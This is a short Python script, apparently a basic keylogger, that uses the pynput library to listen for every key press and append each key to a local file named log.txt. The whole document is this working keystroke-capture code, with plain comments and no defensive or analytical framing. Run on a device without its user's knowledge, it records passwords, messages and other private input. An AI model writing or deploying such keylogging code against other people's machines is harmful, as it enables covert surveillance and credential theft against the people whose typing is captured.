import pynput.keyboard

# A function that will be called every time a key is pressed
def on_press(key):
    # Write the key that was pressed to a file
    with open("log.txt", "a") as f:
        f.write(str(key) + "\n")

# Create a listener that will call the on_press function for each key press
with pynput.keyboard.Listener(on_press=on_press) as listener:
    # Start the listener
    listener.join()
